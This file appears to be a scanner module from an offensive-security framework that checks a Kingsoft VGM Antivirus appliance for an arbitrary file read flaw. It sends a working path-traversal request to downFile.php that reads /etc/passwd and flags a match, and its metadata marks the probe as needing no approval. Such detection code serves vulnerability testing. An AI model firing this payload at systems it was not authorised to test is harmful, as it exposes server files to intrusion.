#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file reading vulnerability in Kingsoft Antivirus."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kingsoft VGM Antivirus - Arbitrary File Read Detection',
        'description': 'There is an arbitrary file reading vulnerability in Kingsoft Antivirus. An attacker can obtain any file on the server through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'kingsoft', 'vgm', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07',
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/kongsoft-vgm-antivirus-wall-rce.yaml',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/downFile.php?filename=../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/force-download',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Kingsoft VGM Antivirus - Arbitrary File Read detected",
                path='/downFile.php?filename=../../../../etc/passwd',
            )
            return True
        return False

